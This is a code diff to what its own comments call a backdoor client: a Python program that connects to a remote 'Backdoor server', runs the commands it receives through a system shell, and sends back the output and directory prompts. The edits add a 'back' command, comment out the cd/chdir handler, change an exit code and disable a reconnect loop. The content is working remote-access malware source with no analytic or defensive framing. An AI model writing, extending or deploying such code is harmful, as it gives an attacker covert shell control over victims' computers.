@@ -162,8 +162,12 @@ def command_shell():
         # `goback` Command use for Set current dir and exit from CMD Hijacking
         if strData == 'goback':
             chdir(strCurrentDir)
-            # main_exec()
+            #main_exec()
             break
+
+        elif strData == 'back':
+            send(b'closed')
+            return main_exec()
 
         # Handling 'cd' command to navigate to Home Directory
         elif len(strData) == 2 and strData == 'cd':
@@ -185,27 +189,7 @@ def command_shell():
             else:
                 byteData = str.encode("\n" + str(getcwd()) + ">> ")
 
-
-        # Handling 'cd' || 'chdir' Command
-        elif strData[:2].lower() == 'dd' or strData[:5].lower() == 'chdir':
-
-            # if len(strData) == 2:
-            # Execute Command and store stdout, stderr and stdin
-            objCommand = subprocess.Popen(strData + " & cd",
-                                          stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                          stdin=subprocess.PIPE ,shell=True)
-
-            # If command runs successfully without any error
-            if (objCommand.stderr.read()).decode('utf-8') == '':
-
-                # Get output of first running command
-                strOutput = (objCommand.stdout.read()).decode('utf-8').splitlines()[0]
-
-                # Change Directory to dir received from the server
-                chdir(strOutput)
-
-                # Create Prompt to send to the Server
-                byteData = str.encode("\n" + str(getcwd()) + ">> ")
+        # TODO: Implement cd .. command
 
         # Handle other Commands received from the server
         elif len(strData) > 0:
@@ -235,6 +219,30 @@ def command_shell():
         send(byteData)
 
 
+        # Handling 'cd' || 'chdir' Command
+        # elif strData[:2].lower() == 'dd' or strData[:5].lower() == 'chdir':
+        #
+        #     # if len(strData) == 2:
+        #     # Execute Command and store stdout, stderr and stdin
+        #     objCommand = subprocess.Popen(strData + " & cd",
+        #                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+        #                                   stdin=subprocess.PIPE ,shell=True)
+        #
+        #     # If command runs successfully without any error
+        #     if (objCommand.stderr.read()).decode('utf-8') == '':
+        #
+        #         # Get output of first running command
+        #         strOutput = (objCommand.stdout.read()).decode('utf-8').splitlines()[0]
+        #
+        #         # Change Directory to dir received from the server
+        #         chdir(strOutput)
+        #
+        #         # Create Prompt to send to the Server
+        #         byteData = str.encode("\n" + str(getcwd()) + ">> ")
+
+
+
+
 
 
 
@@ -261,7 +269,7 @@ def main_exec():
                 # When '--x' Command Submit, Receive 'exit' from the Backdoor server
                 if strData == 'exit':
                     objSocket.close() # noqa
-                    exit(0)
+                    exit(1)
 
                 # When '--m' Command Submit, Receive 'msg' from the Backdoor server
                 elif strData[:3] == 'msg':
@@ -292,7 +300,7 @@ def main_exec():
             objSocket.close()
             del objSocket
             server_connect()
-            main_exec()
+            # main_exec()
 
 main_exec()
 
